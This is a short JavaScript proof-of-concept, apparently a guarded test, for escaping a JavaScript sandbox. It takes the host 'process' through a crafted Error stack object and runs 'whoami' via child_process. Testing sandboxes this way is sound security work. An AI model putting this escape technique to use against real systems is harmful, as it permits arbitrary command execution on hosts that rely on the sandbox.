if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const out = (function () {
	const bad = new Error();
	bad.__proto__ = null;
	bad.stack = {
		match(outer) {
			throw outer.constructor
				.constructor("return process")()
				.mainModule.require("child_" + "process")
				.execSync("whoami")
				.toString();
		},
	};
	return bad;
})();
console.log(out);

setTimeout(() => {
	process.exit(82);
}, 1000);
